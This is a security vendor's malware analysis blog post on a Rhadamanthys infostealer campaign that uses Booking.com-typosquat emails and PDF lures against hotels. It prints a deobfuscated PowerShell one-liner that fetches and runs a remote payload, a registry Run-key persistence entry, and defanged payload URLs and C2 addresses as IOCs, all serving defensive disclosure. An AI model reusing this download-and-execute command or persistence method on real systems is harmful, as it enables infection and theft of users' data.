flex-col-reverse md:flex-row md:items-start md:gap-lg xl:gap-xl mx-auto max-w-screen-lg"><div class="wysiwyg table max-w-full scroll-mt-[120px] wysiwyg-h2:text-h2 wysiwyg-h2:text-navy wysiwyg-h3:text-h3 wysiwyg-h3:text-black wysiwyg-h4:text-h4 wysiwyg-h4:text-grey wysiwyg-h5:text-h5 wysiwyg-h5:text-grey wysiwyg-h6:text-h6 wysiwyg-h6:text-grey wysiwyg-p:text-body-3 wysiwyg-p:text-grey wysiwyg-a:text-veridian wysiwyg-table:w-auto wysiwyg-td:border-1 wysiwyg-td:border-solid wysiwyg-td:border-brumosa wysiwyg-td:p-sm wysiwyg-td:text-center wysiwyg-hr:border-t-4 wysiwyg-hr:border-grey wysiwyg-ul:list-none wysiwyg-ul:pl-3 wysiwyg-li:before:relative wysiwyg-li:before:top-[15px] wysiwyg-li:before:left-[-15px] wysiwyg-li:before:block wysiwyg-li:before:w-[3px] wysiwyg-li:before:h-[3px] wysiwyg-ul:text-grey wysiwyg-li:before:bg-black wysiwyg-ol:text-grey relative z-[1] w-full"><p class="">Yesterday, Lydia blogged about the <a target="_blank" href="https://www.forcepoint.com/blog/x-labs/xworm-malware-targets-united-kingdom-hospitality-sector">XWorm malware</a> that targeted the hospitality sector. Beyond it, X-Labs also observed concurrent activity: the Rhadamanthys infostealer is targeting hotels, restaurants and other businesses in Switzerland and the United Kingdom. </p><p class="">The Rhadamanthys stealer spreads malicious attachments via spoofed emails from Booking.com. During our analysis, we noticed this campaign shared similarities with the <a target="_blank" href="https://www.forcepoint.com/blog/x-labs/agent-tesla-malware-attacks-travel-industry">Agent Tesla activity</a> we saw early in 2024. <o:p></o:p></p><p class="">In the Rhadamanthys campaign, hackers leveraged similar infrastructure but used new obfuscation techniques to steal sensitive information from users. Now, I’ll look deeper into the new techniques to better understand how this infostealer works.<o:p></o:p></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig.%201%20-%20Rhadamanthys%20Attack%20Chain.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 1 </strong>- Rhadamanthys attack chain</em></p><p class=""><strong>Email Analysis:<o:p></o:p></strong></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%202%20-%20Rhadamanthys%20email.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 2 </strong>- Rhadamanthys email</em></p><p class="">Emails take the form of suspicious AI- generated messages which contain technical <span> </span>anomalies—they use generic recipient addresses, “do not reply” keywords and more. The sender domain looks to be typosquat Booking.com domain “@b00king[.]network.” These emails contain a suspicious PDF attachment in the form of fake invoices and alert messages.<o:p></o:p></p><p class=""><br/><strong>Analysis of PDF:<o:p></o:p></strong></p><p class="">When user clicks on the PDF, they see an alert message: “Reader not Supported! Please Open in browser.”</p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%203%20-%20PDF%20attachment.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 3</strong> - PDF Attachment</em></p><p class="">When the user clicks OK, they see another error message that prompts the them <span> </span>to click on the <span> </span>‘Reload’ button. Clicking this button executes  embedded JavaScript code that connects to a malicious URL which downloads the next stage JavaScript payload:</p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%204%20-%20JavaScript%20in%20PDF.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 4</strong> - JavaScript in PDF</em></p><p class="">Embedded code in the PDF connects to typosquat Booking.com URL that leverages a = free hosting domain <span> </span>infrastructure at bo0king[.]blob[.]core.windows[.]net/booking/invoice-1829388947.pdf.html.</p><p class=""><strong>Obfuscated JavaScript payload:<o:p></o:p></strong></p><p class="">The downloaded JavaScript obfuscates by using long variable and function names (507 byte names) and with some inbuilt functions like “parseint().”</p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%205%20-%20Obfuscated%20JavaScript%20payload.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 5</strong> - Obfuscated JavaScript code</em></p><p class="">Upon replacing long variable and function names, we see the next stage obfuscated payload (<strong>Fig. 6</strong> below):<o:p></o:p></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%206%20-%20First%20level%20deobfuscated%20JavaScript.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 6</strong> - First level obfuscated JavaScript</em></p><p class="">Deobfuscation gets us to the actual PowerShell code:<o:p></o:p></p><ul><li>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot; -ep Bypass -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;&amp; (&#x27;{1}{0}&#x27; -f &#x27;ex&#x27;, &#x27;I&#x27;) $(irm hxxps://11decmain[.]blogspot[.]com/////////////loraaaa[.]pdf);Start-Sleep -Seconds 3;<o:p></o:p></li></ul><p class="">From here, we can see that malware authors hosted stage payloads on blogspot.com. This domain redirects to another legitimate cloud repository leveraged to host another PowerShell script that automatically downloads:<o:p></o:p></p><ul><li>hxxps://bitbucket[.]org/!api/2.0/ snippets/nippleskakulcha/xqM7BE/64cd7a0416f33a5e45dbc4b2c7ec5057e0acb21b/files/decfianl[.]txt<o:p></o:p></li></ul><p class="">This script also contains self-signed obfuscated certificate seen after the JavaScript code (see <strong>Fig. 7</strong>):</p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%207%20-%20Obfuscated%20signature%20below%20JavaScript%20code.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 7 </strong>- Obfuscated signature below Javascript code</em></p><p class=""><strong>Analysis of PowerShell script:<o:p></o:p></strong></p><p class="">The script contains huge octal encoded shellcode in variables. It targets legitimate processes like RegSvcs.exe, mhsta.exe, wscript.exe and msbuild.exe in the system that it can stop in order to inject the malcode. <o:p></o:p></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%208%20-%20PowerShell%20script.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 8 </strong>- PowerShell script</em></p><p class="">It’s here we observe the octal to text converter function in the code. From here, the script deletes itself from system and creates another random name payload in the system for persistence.<o:p></o:p></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-12/Fig%209%20-%20Octal%20to%20text%20decode%20function%20in%20PowerShell.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 9</strong> - Octal to text decode function in PowerShell</em></p><p class=""><strong>Analysis of final legitimate process</strong>:<o:p></o:p></p><p class="">When the targeted process injected the malcode, it then creates a new process instance of svchost.exe it uses for further execution. At this point, it connects to the C2 server via an <span> </span>unusual port:<o:p></o:p></p><p class="">185[.]196[.]8[.]68:7257/6d5f5120d519e2005/jl1w2l3p.070xf<o:p></o:p></p><p class="">Once connected, it:<o:p></o:p></p><ul><li>Tries to steal the user’s personal information from browsers history<o:p></o:p></li><li>Tries to gather system information<o:p></o:p></li><li>Creates a task scheduler that <span> </span>embeds PowerShell code in the system registry for persistence: <o:p></o:p></li></ul><p class="">“Software\Microsoft\Windows\CurrentVersion\Run\Uplatbook-141 = &quot;schtasks /run /tn Uplatbook-141”” <o:p></o:p></p><ul><li>Uses an unregistered version of .net reactor obfuscator<o:p></o:p></li><li>Abuses Chrome and edge.exe explicitly to perform connection with remote host</li></ul><h2>Conclusion:<o:p></o:p></h2><p class="">This Rhadamanthys stealer attack relies on typo-squatted domains and malicious PDFs to deliver obfuscated payloads and execute PowerShell scripts. It uses free hosting services and cloud repositories to evade detection to install <span> </span>persistence mechanisms like task scheduling and registry modifications. <o:p></o:p></p><p class="">By leveraging legitimate processes, it establishes stealthy communication with its C2 server and attempts to steal browser data along with system information. Sophisticated obfuscation techniques like using long variable names and octal encoding achieve the desired affect—making detection and analysis more complex.<o:p></o:p></p><h2>Protection statement: <o:p></o:p></h2><p class=""><span>Forcepoint customers are protected against this threat at the following stages of attack:<o:p></o:p></span></p><ul><li><span><strong>Stage 2 (Lure)</strong> – Malicious PDF attachments associated with these attacks are identified and blocked by email security analytics.<o:p></o:p></span></li><li><span><strong>Stage 3 (Redirect)</strong> – Blocked redirectional blogspot URLs and Bitbutcket cloud project URLs by web real time security scan.<o:p></o:p></span></li><li><span><strong>Stage 5 (Dropper File)</strong> - The dropper files are added to Forcepoint malicious database and are blocked.<o:p></o:p></span></li><li><span><strong>Stage 6 (Call Home)</strong> - Blocked C2 credentials</span></li></ul><h2>IOCs<o:p></o:p></h2><p class=""><span><strong>Initial Stage URLs: <o:p></o:p></strong></span></p><ul><li>bo0king[.]blob[.]core.windows[.]net/booking/invoice-1829388947.pdf.html<span><o:p></o:p></span></li><li>hxxps://11decmain[.]blogspot[.]com/////////////loraaaa[.]pdf<span><o:p></o:p></span></li><li>hxxps://bitbucket[.]org/!api/2.0/ snippets/nippleskakulcha/xqM7BE/64cd7a0416f33a5e45dbc4b2c7ec5057e0acb21b/files/decfianl[.]txt<o:p></o:p></li></ul><p class=""><span><strong>C2s:<o:p></o:p></strong></span></p><ul><li><span>185[.]196[.]8[.]68<o:p></o:p></span></li><li><span>185[.]196[.]11[.]18</span></li></ul><p class=""><span><strong>Spoofed Senders domain:<o:p></o:p></strong></span></p><ul><li>b00king[.]biz<o:p></o:p></li><li>b00king[.]co[.]za<o:p></o:p></li><li>b00king[.]network<o:p></o:p><o:p></o:p><o:p></o:p><o:p></o:p><o:p></o:p><o:p></o:p></li></ul></div></div><ul class="flex shrink-0 flex-col max-md:mb-md"><li class="border-b-2 border-brumosa py-xl last:border-0"><div class="md:flex"><div class="flex-grow-1 mr-lg flex shrink-0 basis-[120px] max-md:mb-md"><img
